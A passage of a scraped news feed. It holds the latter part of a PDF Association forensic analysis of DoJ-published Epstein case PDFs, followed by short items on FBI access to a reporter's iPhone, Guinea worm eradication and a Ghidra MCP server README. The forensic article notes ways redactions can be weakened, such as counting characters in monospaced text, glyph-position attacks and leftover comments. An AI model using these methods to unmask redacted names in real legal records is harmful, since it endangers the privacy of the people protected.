<h2 id="different-incremental-updates">Different incremental updates</h2>
<p>Another randomly selected PDF, VOL00003\IMAGES\0001\EFTA00003939.pdf contains 3 full-page images, and just a single incremental update that applies the Bates numbering. However, in this case the file header is <code>%PDF-1.5</code> yet both the original PDF and incremental update use conventional cross-reference tables! This isn’t problematic, but is certainly unexpected and inefficient since PDF 1.5 introduced compressed cross-reference streams.</p>
<p>By comparing the objects in the incremental cross-reference table to the original cross-reference table we can see that objects 66 to 69 – the 3 Page objects for the 3 page document – were redefined. This is just what is expected in order to add the Bates number to each page’s <strong>Contents</strong> stream as in the previous example.</p>

<p>Our initial examination using pdfinfo utilities did not identify any metadata in any of the PDFs in the tranche, either in the document information dictionary (PDF file trailer Info entry) or as an XMP metadata stream (<strong>Metadata</strong> entry).</p>
<p>However, since we know that (a) the tranche includes PDFs with incremental updates, and (b) that an orphaned document information dictionary exists, all revisions of a document should be thoroughly examined. Incremental updates may have marked other document information dictionaries or XMP metadata streams as free but not deleted the actual data.</p>
<p>XMP metadata is always encoded in PDF as a stream object, and since stream objects cannot be in compressed object streams, using forensic tools to search for keys “<code>/XML</code>” or “<code>/Metadata</code>” should always locate them. All modern office suites and PDF creation applications will generate XMP metadata when exporting to PDF. As XMP is usually uncompressed, searching for XML fragments may also be helpful (see below for an example XMP object fragment).</p>
<pre>     3 0 obj
     &lt;&lt;/Length 36996/Subtype/XML/Type/Metadata&gt;&gt;
     stream
     &lt;?xpacket begin="ï»¿" id="W5M0MpCe … zNTczkc9d"?&gt;
     &lt;x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk=" … "&gt;
         &lt;rdf:RDF 
     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"&gt;
              &lt;rdf:Description rdf:about=""
                   xmlns:dc="http://purl.org/dc/elements/1.1/"
                   xmlns:xmp="http://ns.adobe.com/xap/1.0/"
     ...</pre>
<p>Not unsurprisingly for properly-redacted files, we did not find any XMP metadata streams or XML in any PDF. As a consequence, none of the PDFs can declare conformance to either PDF/A (ISO 19005 for long-term archiving) or PDF/UA (ISO 14289 for accessibility). Of course, as untagged PDFs, the files cannot conform to accessibility specifications such as PDF/UA or WCAG in any event. Additionally, none of the PDFs appear to include device-independent color spaces.</p>
<p>The presence of an <strong>Info</strong> entry in the trailer dictionary or (in PDFs with cross-reference streams) in the cross-reference stream dictionary indicates the presence of document information dictionaries. “<code>/Info</code>” does indeed occur in many of the PDFs, including multiple times in some PDFs, indicating potential changes via incremental updates. However, as discovered above, in some cases the final incremental update does not include an <strong>Info</strong> entry, thus “orphaning” any existing document information dictionaries.</p>
<p>ISO 32000-2:2020, Table 349 lists the defined entries in PDF’s document information dictionary (<strong>Title</strong>, <strong>Author</strong>, <strong>Subject</strong>, etc). Any vendor may add additional entries (such as <a href="https://developer.apple.com/documentation/coregraphics/kcgpdfcontextkeywords" target="_blank" rel="noopener">Apple does with its <span>/AAPL:Keywords</span> entry</a>), so redaction and sanitization software should be aware of extra entries.</p>
<p>From our random sampling, we identified one PDF with a non-trivial document information dictionary still present: VOL00002\IMAGES\0001\EFTA00003212.pdf. This is shown below in <a href="https://pdfa.org/resource/vscode-extension-pdf-cos-syntax-support/">Visual Studio Code with my pdf-cos-syntax extension</a>:</p>
<p><img loading="lazy" decoding="async" src="https://pdfa.org/wp-content/uploads/2025/12/1-69.png" alt="Screenshot of VS Code discussed in the text." width="766" height="1284" srcset="https://pdfa.org/wp-content/uploads/2025/12/1-69.png 766w, https://pdfa.org/wp-content/uploads/2025/12/1-69-179x300.png 179w, https://pdfa.org/wp-content/uploads/2025/12/1-69-611x1024.png 611w, https://pdfa.org/wp-content/uploads/2025/12/1-69-600x1006.png 600w" sizes="auto, (max-width: 766px) 100vw, 766px"></p>
<p><span>Of additional interest in this specific PDF is that the comment at line 60 has survived DoJ’s sanitization and redaction workflow! Other PDF comments may therefore also be present in other files.</span></p>
<p><span>EFTA00003212.pdf appears to be a redacted image or an error from the DoJ workflow, as it is a single page with the text “No Images Produced”.</span></p>
<p><span>Simple searching of the standardized PDF document information dictionary entries gives the following (note that the technique used will not locate information in compressed object streams, as mentioned above):</span></p>
<table>
<tbody>
<tr>
<td><strong>Key name</strong></td>
<td><strong>Number of PDFs (max. = 4,085)</strong></td>
<td><strong>Comment</strong></td>
</tr>
<tr>
<td><strong>Info</strong></td>
<td>3,823</td>
<td>Some PDFs have empty <strong>Info</strong> dictionaries with no entries</td>
</tr>
<tr>
<td><strong>Title</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>Author</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>Subject</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>Keywords</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>Creator</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>Producer</strong></td>
<td>215</td>
<td>Always “pypdf” (denotes <a href="https://pypi.org/project/pypdf/" target="_blank" rel="noopener">https://pypi.org/project/pypdf/</a>)</td>
</tr>
<tr>
<td><strong>CreationDate</strong></td>
<td>3,609</td>
<td>Same PDFs that have <strong>ModDate</strong> with an identical value</td>
</tr>
<tr>
<td><strong>ModDate</strong></td>
<td>3,609</td>
<td>Same PDFs that have <strong>CreationDate</strong> with an identical value</td>
</tr>
<tr>
<td><strong>Trapped</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>APPL:Keywords</strong></td>
<td>0</td>
<td></td>
</tr>
</tbody>
</table>

<h3 id="date-analysis">Date analysis</h3>
<p>Detailed date analysis is a common task in the forensic analysis of potentially fraudulent or modified documents. However, in the case of redacted or sanitized documents, where the document is known to have been modified, this can be less useful.</p>
<p>The creation and modification dates for the 3,609 PDFs range from December 18, 2025, 14:32:05 (2:32 pm) to December 19, 2025, 23:26:13 (almost midnight). For all files, the creation and modification dates are always the same. This may also imply that the DoJ batch processing to prepare this tranche of PDFs took at least 36 hours!</p>
<p>What’s also interesting is that the <strong>CreationDate</strong> and <strong>ModDate</strong> fields in the hidden document information dictionary (inside the object stream of the first increment update – see above) appear to always be an exact match to both the <strong>CreationDate</strong> and <strong>ModDate</strong> of the original document. This implies that all dates across all incremental updates were updated in a single processing pass that applied the Bates numbering.</p>
<h2 id="photographs">Photographs</h2>
<p>There are no JPEG images (<strong>DCTDecode </strong>filter) in any PDF in the tranche, including the full-page photographs. Randomly viewing the photographic images at high magnification (zoom) in PDF viewers clearly shows JPEG “jaggy” <a href="https://en.wikipedia.org/wiki/Compression_artifact" target="_blank" rel="noopener">compression artifacts</a>. All photographic images appear to have been downscaled to 96 DPI (769 x 1152 or 1152 x 769 pixels), making text on random objects in the photos much harder to discern (see the <a href="#ocr">OCR discussion below</a>).</p>
<p>DoJ explicitly avoids JPEG images in the PDFs probably because they appreciate that JPEGs often contain identifiable information, such as EXIF, IPTC, or XMP metadata, as well as <a href="https://exiftool.org/#JPEG" target="_blank" rel="noopener">COM (comment) tags</a> in the JPEG bitstream. This information may disclose the camera model and serial number, GPS location, camera operator details, date/time of the photo, etc., and is more difficult to redact while retaining the JPEG data. The DoJ processing pipeline has therefore explicitly converted all lossy JPEG images to low DPI, FLATE-encoded bitmaps in the PDFs using an indexed device-dependent color space with a palette of 256 unique colors (which reduces the color fidelity compared to the original high-quality digital color photograph).</p>
<h2 id="scanned-documents-or-are-they">Scanned documents – or are they?</h2>
<p>Randomly inspecting the tranche discovers many documents that appear to have been created by a scanning process. On closer inspection, there are documents that have tell-tale artifacts from a physical scanning process, such as visible physical paper edges, punched holes, staple marks, spiral binding, stamps, paper scuff marks, color blotches and inconsistencies, handwritten notes or marginalia, varying paper skew, and platen marks from the physical paper scanning processes. For example, VOL00007\IMAGES\0001\EFTA00009440.pdf shows many of these aspects</p>
<p>There are also other documents that appear to <span><em>simulate</em></span> a scanned document but completely lack the “real-world noise” expected with physical paper-based workflows. The much crisper images appear almost perfect without random artifacts or background noise, and with the exact same amount of image skew across multiple pages. Thanks to the borders around each page of text, page skew can easily be measured, such as with VOL00007\IMAGES\0001\EFTA00009229.pdf. It is highly likely these PDFs were created by rendering original content (from a digital document) to an image (e.g., via print to image or save to image functionality) and then applying image processing such as skew, downscaling, and color reduction.</p>
<p>The use of the timeless monospaced (also known as fixed-width) “Courier” typeface means that the number of characters redacted can be easily determined by vertical alignment with text lines above and below each redaction. In some instances, this may reduce the possible number of options that represent the redacted content, allowing it to be more easily guessed. Although redaction of variable-width typefaces is far more complex, Bland, M., Iyer, A., and Levchenko, K. 2022 paper “<a href="http://arxiv.org/abs/2206.02285" target="_blank" rel="noopener">Story Beyond the Eye: Glyph Positions Break PDF Text Redaction</a>” showed that this is still possible with sufficient computing power and determination.</p>
<h3 id="optical-character-recognition-ocr"><a id="ocr"></a>Optical Character Recognition (OCR)</h3>
<p><a href="https://en.wikipedia.org/wiki/Optical_character_recognition" target="_blank" rel="noopener">OCR</a> is complex image processing that attempts to identify text in bitmap images. In PDF files, OCR-identified text is commonly placed on top of the image using the invisible text render mode. This enables users to then extract the text from the image.</p>
<p>Returning to the very first PDF file in the tranche, VOL00001\IMAGES\0001\EFTA00000001.pdf - this is a full-page photo of a hand-written sign where part of the hand-written information is explicitly redacted. The PDF contains largely inaccurate OCR-ed text, indicating that natural language processing (NLP), machine learning (ML), or even language aware dictionary-based algorithms were not used. This means that there will be more errors in the extracted text than is necessary.</p>
<p>With cloud platforms readily accessible and supporting advanced OCR at low cost, anyone is capable of re-processing the entire tranche of PDFs and comparing the OCR results to those provided by DoJ. Even though the page images are low-resolution (96 DPI), rerunning OCR may bring to light additional or corrected information hidden by the original OCR that failed to recognize everything correctly.</p>
<p>The “black box” redactions we investigated were all correctly applied directly into the image pixel data. They are not separate PDF rectangle objects simply floating above sensitive information that was still present in the image and easily discoverable. Yes, sometimes it is that easy…!</p>
<h2 id="conclusion">Conclusion</h2>
<p>We did not set out to comprehensively analyze every corner of every PDF file in the Epstein PDFs, but to present a basic walk-through of some of the challenges and tricks used to conduct a PDF forensic assessment. Our results above were from a small random sample of documents - there may well be outlier PDFs in the data sets that we did not encounter.</p>
<p>The DoJ has clearly created internal processes, systems, and workflows that can sanitize and redact information prior to publishing as PDF. This includes converting JPEG images to low-resolution pixel-only bitmaps, largely removing metadata, and rendering page images to bitmaps. OCR appears to have been widely applied, but is of variable quality.</p>
<p>Their PDF technology could be improved to vastly reduce file size by removing unnecessary objects (e.g., empty content streams, ProcSets, empty thumbnail references, etc.), simplifying and reducing content streams, applying all incremental updates (i.e., removing all incremental update sections), and always using compressed object streams and compressed cross-reference streams. Information leakage may also be occurring via PDF comments or orphaned objects inside compressed object streams, as I discovered above.</p>
<p>PDF forensics is a highly complex field, where variations in files and tool assumptions can easily yield false results. The PDF Association hosts a PDF Forensic Liaison Working Group to develop industry guidance on forensic examination of PDF files and to educate document examiners and other specialists about many of these aspects.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[FBI couldn't get into WaPo reporter's iPhone because Lockdown Mode enabled (361 pts)]]></title>
            <link>https://www.404media.co/fbi-couldnt-get-into-wapo-reporters-iphone-because-it-had-lockdown-mode-enabled/</link>
            <guid>46886237</guid>
            <pubDate>Wed, 04 Feb 2026 14:31:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.404media.co/fbi-couldnt-get-into-wapo-reporters-iphone-because-it-had-lockdown-mode-enabled/">https://www.404media.co/fbi-couldnt-get-into-wapo-reporters-iphone-because-it-had-lockdown-mode-enabled/</a>, See on <a href="https://news.ycombinator.com/item?id=46886237">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  
<!--kg-card-begin: html-->

<!--kg-card-end: html-->
<p>The FBI has been unable to access a Washington Post reporter’s seized iPhone because it was in Lockdown Mode, a sometimes overlooked feature that makes iPhones broadly more secure, according to recently filed court records.</p><p>The court record shows what devices and data the FBI was able to ultimately access, and which devices it could not, after <a href="https://www.theguardian.com/us-news/2026/jan/14/fbi-raid-washington-post-hannah-natanson?ref=404media.co"><u>raiding the home of the reporter</u></a>, Hannah Natanson, in January as part of an investigation into leaks of classified information. It also provides rare insight into the apparent effectiveness of Lockdown Mode, or at least how effective it might be before the FBI may try other techniques to access the device.</p><div><p>💡</p><p><b><strong>Do you know anything else about phone unlocking technology? I would love to hear from you. Using a non-work device, you can message me securely on Signal at joseph.404 or send me an email at joseph@404media.co.</strong></b></p></div>
</div><div>
  <div>
    <h2>This post is for paid members only</h2>
    <p>Become a paid member for unlimited ad-free access to articles, bonus podcast content, and more.</p>
    <p><a href="https://www.404media.co/membership/">Subscribe</a>
  </p></div>
  <div>
    <h2>Sign up for free access to this post</h2>
    <p>Free members get access to posts like this one along with an email round-up of our week's stories.</p>
    <p><a href="https://www.404media.co/signup/">Subscribe</a>
  </p></div>
  <p>Already have an account? <a href="https://www.404media.co/signin/" data-portal="signin">Sign in</a></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Guinea worm on track to be 2nd eradicated human disease; only 10 cases in 2025 (110 pts)]]></title>
            <link>https://arstechnica.com/health/2026/02/guinea-worm-on-track-to-be-2nd-eradicated-human-disease-only-10-cases-in-2025/</link>
            <guid>46886191</guid>
            <pubDate>Wed, 04 Feb 2026 14:27:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/health/2026/02/guinea-worm-on-track-to-be-2nd-eradicated-human-disease-only-10-cases-in-2025/">https://arstechnica.com/health/2026/02/guinea-worm-on-track-to-be-2nd-eradicated-human-disease-only-10-cases-in-2025/</a>, See on <a href="https://news.ycombinator.com/item?id=46886191">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                      
                      
          <p>A debilitating infection from the parasitic Guinea worm is inching closer to global eradication, with an all-time low of only 10 human cases reported worldwide in 2025, <a href="https://www.cartercenter.org/news/guinea-worm-announcement/">the Carter Center announced</a>.</p>
<p>If health workers can fully wipe out the worms, it will be only the second human disease to be eradicated, after smallpox.</p>
<p>Guinea worm (<em>Dracunculus medinensis</em>) is a parasitic nematode transmitted in water. More specifically, it’s found in waters that contain small crustacean copepods, which harbor the worm’s larvae. If a person consumes water contaminated with Guinea worm, the parasites burrow through the intestinal tract and migrate through the body. About a year later, a spaghetti noodle-length worm emerges from a painful blister, usually in the feet or legs. It can take up to eight weeks for the adult worm to fully emerge. To ease the searing pain, infected people may put their blistered limbs in water, allowing the parasite to release more larvae and continue the cycle.</p>
<p>In addition to being extremely painful, the disease (dracunculiasis) can lead to complications, such as secondary infections and sepsis, which in turn can lead to temporary or permanent disability.</p>
<p>When the Guinea worm eradication program began in 1986, there were an estimated 3.5 million cases across 21 countries in Africa and Asia. To date, only six countries have not been certified by the World Health Organization as Guinea worm-free. In 2024, there were just 15 cases, and, according to the provisional tally for 2025, the number is down to just 10. It’s considered provisional until each country’s disease reports are confirmed, which occurs in a program meeting usually held in April.</p>

          
                      
                  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Ghidra MCP Server – 110 tools for AI-assisted reverse engineering (211 pts)]]></title>
            <link>https://github.com/bethington/ghidra-mcp</link>
            <guid>46882389</guid>
            <pubDate>Wed, 04 Feb 2026 06:51:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/bethington/ghidra-mcp">https://github.com/bethington/ghidra-mcp</a>, See on <a href="https://news.ycombinator.com/item?id=46882389">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Ghidra MCP Server</h2><a id="user-content-ghidra-mcp-server" aria-label="Permalink: Ghidra MCP Server" href="#ghidra-mcp-server"></a></p>
<p dir="auto"><a href="https://opensource.org/licenses/Apache-2.0" rel="nofollow"><img src="https://camo.githubusercontent.com/a549a7a30bacba7bfceebdc207a8e86c3f2c02995a2527640dca30048fd2b64e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d417061636865253230322e302d626c75652e737667" alt="License" data-canonical-src="https://img.shields.io/badge/License-Apache%202.0-blue.svg"></a>
<a href="https://openjdk.java.net/projects/jdk/21/" rel="nofollow"><img src="https://camo.githubusercontent.com/b4a38f2fc33ed2f57cbcfd6988fe6791b914b802842fe66aa164e86cff6534cf/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a6176612d32312532304c54532d6f72616e67652e737667" alt="Java Version" data-canonical-src="https://img.shields.io/badge/Java-21%20LTS-orange.svg"></a>
<a href="https://ghidra-sre.org/" rel="nofollow"><img src="https://camo.githubusercontent.com/f52e0f0fcd3839839366190b582ccf024b8c0246358764859575923205758940/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4768696472612d31322e302e322d677265656e2e737667" alt="Ghidra Version" data-canonical-src="https://img.shields.io/badge/Ghidra-12.0.2-green.svg"></a>
<a href="https://github.com/bethington/ghidra-mcp/blob/main/CHANGELOG.md"><img src="https://camo.githubusercontent.com/df860fb53ded212171a8bb5287d797865dae05df12f96c283ba44aa14f644a5a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f56657273696f6e2d322e302e302d627269676874677265656e2e737667" alt="Version" data-canonical-src="https://img.shields.io/badge/Version-2.0.0-brightgreen.svg"></a></p>
<blockquote>
<p dir="auto">If you find this useful, please ⭐ star the repo — it helps others discover it!</p>
</blockquote>
<p dir="auto">A production-ready Model Context Protocol (MCP) server that bridges Ghidra's powerful reverse engineering capabilities with modern AI tools and automation frameworks.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">🌟 Features</h2><a id="user-content--features" aria-label="Permalink: 🌟 Features" href="#-features"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Core MCP Integration</h3><a id="user-content-core-mcp-integration" aria-label="Permalink: Core MCP Integration" href="#core-mcp-integration"></a></p>
<ul dir="auto">
<li><strong>Full MCP Compatibility</strong> - Complete implementation of Model Context Protocol</li>
<li><strong>110 MCP Tools Available</strong> - Comprehensive API surface for binary analysis</li>
<li><strong>Production-Ready Reliability</strong> - Tested batch operations and atomic transactions</li>
<li><strong>Real-time Analysis</strong> - Live integration with Ghidra's analysis engine</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Binary Analysis Capabilities</h3><a id="user-content-binary-analysis-capabilities" aria-label="Permalink: Binary Analysis Capabilities" href="#binary-analysis-capabilities"></a></p>
<ul dir="auto">
<li><strong>Function Analysis</strong> - Decompilation, call graphs, cross-references</li>
<li><strong>Data Structure Discovery</strong> - Automatic struct/union/enum creation</li>
<li><strong>String Extraction</strong> - Comprehensive string analysis and categorization</li>
<li><strong>Import/Export Analysis</strong> - Symbol table and library dependency mapping</li>
<li><strong>Memory Mapping</strong> - Complete memory layout documentation</li>
<li><strong>Cross-Binary Documentation</strong> - Function hash matching across binary versions</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Development &amp; Automation</h3><a id="user-content-development--automation" aria-label="Permalink: Development &amp; Automation" href="#development--automation"></a></p>
<ul dir="auto">
<li><strong>Automated Development Cycle</strong> - Complete build-test-deploy-verify pipeline</li>
<li><strong>Ghidra Script Management</strong> - Create, run, and manage Ghidra scripts via MCP</li>
<li><strong>Multi-Program Support</strong> - Switch between and compare multiple open programs</li>
<li><strong>Batch Operations</strong> - Efficient bulk renaming, commenting, and typing</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🚀 Quick Start</h2><a id="user-content--quick-start" aria-label="Permalink: 🚀 Quick Start" href="#-quick-start"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Prerequisites</h3><a id="user-content-prerequisites" aria-label="Permalink: Prerequisites" href="#prerequisites"></a></p>
<ul dir="auto">
<li><strong>Java 21 LTS</strong> (OpenJDK recommended)</li>
<li><strong>Apache Maven 3.9+</strong></li>
<li><strong>Ghidra 12.0.2</strong> (or compatible version)</li>
<li><strong>Python 3.8+</strong> with pip</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Installation</h3><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<ol dir="auto">
<li>
<p dir="auto"><strong>Clone the repository:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/bethington/ghidra-mcp.git
cd ghidra-mcp"><pre>git clone https://github.com/bethington/ghidra-mcp.git
<span>cd</span> ghidra-mcp</pre></div>
</li>
<li>
<p dir="auto"><strong>Install Python dependencies:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="pip install -r requirements.txt"><pre>pip install -r requirements.txt</pre></div>
</li>
<li>
<p dir="auto"><strong>Copy Ghidra libraries</strong> (see <a href="#library-dependencies">Library Dependencies</a> for full list):</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Windows - run the provided batch script
copy-ghidra-libs.bat &quot;C:\path\to\ghidra_12.0.2_PUBLIC&quot;

# Linux/Mac - copy manually from your Ghidra installation
# See Library Dependencies section below for all 14 required JARs"><pre><span><span>#</span> Windows - run the provided batch script</span>
copy-ghidra-libs.bat <span><span>"</span>C:\path\to\ghidra_12.0.2_PUBLIC<span>"</span></span>

<span><span>#</span> Linux/Mac - copy manually from your Ghidra installation</span>
<span><span>#</span> See Library Dependencies section below for all 14 required JARs</span></pre></div>
</li>
<li>
<p dir="auto"><strong>Build the plugin:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="mvn clean package assembly:single -DskipTests"><pre>mvn clean package assembly:single -DskipTests</pre></div>
</li>
<li>
<p dir="auto"><strong>Deploy to Ghidra:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="# Windows (automated)
.\deploy-to-ghidra.ps1

# Or manually copy to Ghidra Extensions
Copy-Item target\GhidraMCP-2.0.0.zip &quot;C:\ghidra\Extensions\Ghidra\&quot;"><pre><span><span>#</span> Windows (automated)</span>
.<span>\deploy-to</span><span>-</span>ghidra.ps1

<span><span>#</span> Or manually copy to Ghidra Extensions</span>
<span>Copy-Item</span> target\GhidraMCP<span>-</span><span>2.0</span>.<span>0.</span>zip <span><span>"</span>C:\ghidra\Extensions\Ghidra\<span>"</span></span></pre></div>
</li>
</ol>
<p dir="auto"><h3 tabindex="-1" dir="auto">Basic Usage</h3><a id="user-content-basic-usage" aria-label="Permalink: Basic Usage" href="#basic-usage"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Option 1: Stdio Transport (Recommended for AI tools)</h4><a id="user-content-option-1-stdio-transport-recommended-for-ai-tools" aria-label="Permalink: Option 1: Stdio Transport (Recommended for AI tools)" href="#option-1-stdio-transport-recommended-for-ai-tools"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="python bridge_mcp_ghidra.py"><pre>python bridge_mcp_ghidra.py</pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">Option 2: SSE Transport (Web/HTTP clients)</h4><a id="user-content-option-2-sse-transport-webhttp-clients" aria-label="Permalink: Option 2: SSE Transport (Web/HTTP clients)" href="#option-2-sse-transport-webhttp-clients"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="python bridge_mcp_ghidra.py --transport sse --mcp-host 127.0.0.1 --mcp-port 8081"><pre>python bridge_mcp_ghidra.py --transport sse --mcp-host 127.0.0.1 --mcp-port 8081</pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">In Ghidra</h4><a id="user-content-in-ghidra" aria-label="Permalink: In Ghidra" href="#in-ghidra"></a></p>
<ol dir="auto">
<li>Start Ghidra and load a binary</li>
<li>Go to <strong>Tools &gt; GhidraMCP &gt; Start MCP Server</strong></li>
<li>The server runs on <code>http://127.0.0.1:8080/</code> by default</li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">📊 Production Performance</h2><a id="user-content--production-performance" aria-label="Permalink: 📊 Production Performance" href="#-production-performance"></a></p>
<ul dir="auto">
<li><strong>MCP Tools</strong>: 110 tools fully implemented</li>
<li><strong>Speed</strong>: Sub-second response for most operations</li>
<li><strong>Efficiency</strong>: 93% reduction in API calls via batch operations</li>
<li><strong>Reliability</strong>: Atomic transactions with all-or-nothing semantics</li>
<li><strong>Deployment</strong>: Automated version-aware deployment script</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🛠️ API Reference</h2><a id="user-content-️-api-reference" aria-label="Permalink: 🛠️ API Reference" href="#️-api-reference"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Core Operations</h3><a id="user-content-core-operations" aria-label="Permalink: Core Operations" href="#core-operations"></a></p>
<ul dir="auto">
<li><code>check_connection</code> - Verify MCP connectivity</li>
<li><code>get_metadata</code> - Program metadata and info</li>
<li><code>get_version</code> - Server version information</li>
<li><code>get_entry_points</code> - Binary entry points discovery</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Function Analysis</h3><a id="user-content-function-analysis" aria-label="Permalink: Function Analysis" href="#function-analysis"></a></p>
<ul dir="auto">
<li><code>list_functions</code> - List all functions (paginated)</li>
<li><code>search_functions_by_name</code> - Search functions by name/pattern</li>
<li><code>search_functions_enhanced</code> - Advanced function search with filters</li>
<li><code>decompile_function</code> - Decompile function to C pseudocode</li>
<li><code>get_decompiled_code</code> - Get decompiled code by address</li>
<li><code>get_function_callers</code> - Get function callers</li>
<li><code>get_function_callees</code> - Get function callees</li>
<li><code>get_function_call_graph</code> - Function relationship graph</li>
<li><code>get_full_call_graph</code> - Complete call graph for program</li>
<li><code>analyze_function_complete</code> - Comprehensive function analysis</li>
<li><code>analyze_function_completeness</code> - Documentation completeness score</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Memory &amp; Data</h3><a id="user-content-memory--data" aria-label="Permalink: Memory &amp; Data" href="#memory--data"></a></p>
<ul dir="auto">
<li><code>list_segments</code> - Memory segments and layout</li>
<li><code>get_function_by_address</code> - Function at address</li>
<li><code>disassemble_function</code> - Disassembly listing</li>
<li><code>disassemble_bytes</code> - Raw byte disassembly</li>
<li><code>get_xrefs_to</code> - Cross-references to address</li>
<li><code>get_xrefs_from</code> - Cross-references from address</li>
<li><code>get_bulk_xrefs</code> - Bulk cross-reference lookup</li>
<li><code>analyze_data_region</code> - Analyze memory region structure</li>
<li><code>inspect_memory_content</code> - View raw memory content</li>
<li><code>detect_array_bounds</code> - Detect array boundaries</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Cross-Binary Documentation (v1.9.4+)</h3><a id="user-content-cross-binary-documentation-v194" aria-label="Permalink: Cross-Binary Documentation (v1.9.4+)" href="#cross-binary-documentation-v194"></a></p>
<ul dir="auto">
<li><code>get_function_hash</code> - SHA-256 hash of normalized function opcodes</li>
<li><code>get_bulk_function_hashes</code> - Paginated bulk hashing with filter</li>
<li><code>get_function_documentation</code> - Export complete function documentation</li>
<li><code>apply_function_documentation</code> - Import documentation to target function</li>
<li><code>build_function_hash_index</code> - Build persistent JSON index</li>
<li><code>lookup_function_by_hash</code> - Find matching functions in index</li>
<li><code>propagate_documentation</code> - Apply docs to all matching instances</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Data Types &amp; Structures</h3><a id="user-content-data-types--structures" aria-label="Permalink: Data Types &amp; Structures" href="#data-types--structures"></a></p>
<ul dir="auto">
<li><code>list_data_types</code> - Available data types</li>
<li><code>search_data_types</code> - Search for data types</li>
<li><code>create_struct</code> - Create custom structure</li>
<li><code>add_struct_field</code> - Add field to structure</li>
<li><code>modify_struct_field</code> - Modify existing field</li>
<li><code>remove_struct_field</code> - Remove field from structure</li>
<li><code>create_enum</code> - Create enumeration</li>
<li><code>get_enum_values</code> - Get enumeration values</li>
<li><code>create_array_type</code> - Create array data type</li>
<li><code>apply_data_type</code> - Apply type to address</li>
<li><code>delete_data_type</code> - Delete a data type</li>
<li><code>consolidate_duplicate_types</code> - Merge duplicate types</li>
<li><code>get_valid_data_types</code> - Get list of valid Ghidra types</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Symbols &amp; Labels</h3><a id="user-content-symbols--labels" aria-label="Permalink: Symbols &amp; Labels" href="#symbols--labels"></a></p>
<ul dir="auto">
<li><code>list_imports</code> - Imported symbols and libraries</li>
<li><code>list_exports</code> - Exported symbols and functions</li>
<li><code>list_external_locations</code> - External location references</li>
<li><code>list_strings</code> - Extracted strings with analysis</li>
<li><code>list_namespaces</code> - Available namespaces</li>
<li><code>list_globals</code> - Global variables</li>
<li><code>create_label</code> - Create label at address</li>
<li><code>batch_create_labels</code> - Bulk label creation</li>
<li><code>delete_label</code> - Delete label at address</li>
<li><code>batch_delete_labels</code> - Bulk label deletion</li>
<li><code>rename_label</code> - Rename existing label</li>
<li><code>rename_or_label</code> - Rename or create label</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Renaming &amp; Documentation</h3><a id="user-content-renaming--documentation" aria-label="Permalink: Renaming &amp; Documentation" href="#renaming--documentation"></a></p>
<ul dir="auto">
<li><code>rename_function</code> - Rename function by name</li>
<li><code>rename_function_by_address</code> - Rename function by address</li>
<li><code>rename_data</code> - Rename data item</li>
<li><code>rename_variables</code> - Rename function variables</li>
<li><code>rename_global_variable</code> - Rename global variable</li>
<li><code>rename_external_location</code> - Rename external reference</li>
<li><code>batch_rename_function_components</code> - Bulk renaming</li>
<li><code>set_decompiler_comment</code> - Set decompiler comment</li>
<li><code>set_disassembly_comment</code> - Set disassembly comment</li>
<li><code>set_plate_comment</code> - Set function plate comment</li>
<li><code>get_plate_comment</code> - Get function plate comment</li>
<li><code>batch_set_comments</code> - Bulk comment setting</li>
</ul>
